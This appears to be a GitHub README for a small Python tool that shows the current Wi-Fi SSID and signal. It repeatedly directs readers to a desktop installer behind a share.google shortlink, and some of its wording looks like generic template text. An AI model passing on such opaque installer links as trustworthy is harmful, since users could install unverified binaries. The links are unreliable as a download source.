![Netsh WLAN Show](assets/hero.png)

# Netsh WLAN Show

*Which Wi-Fi you are on, nothing else.*

## Overview

**Netsh WLAN Show** runs on your own PC. Show the current WLAN interface, SSID, and signal without dumping profiles or keys.

You want SSID and signal, not a password dump.

Files stay on the machine that runs the tool. Originals are left alone unless you choose otherwise.

## Editions

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- SSID
- Signal
- Interface name
- No key material

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Download

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/henry2624/netsh-wlan-show

MIT license. See `LICENSE`.
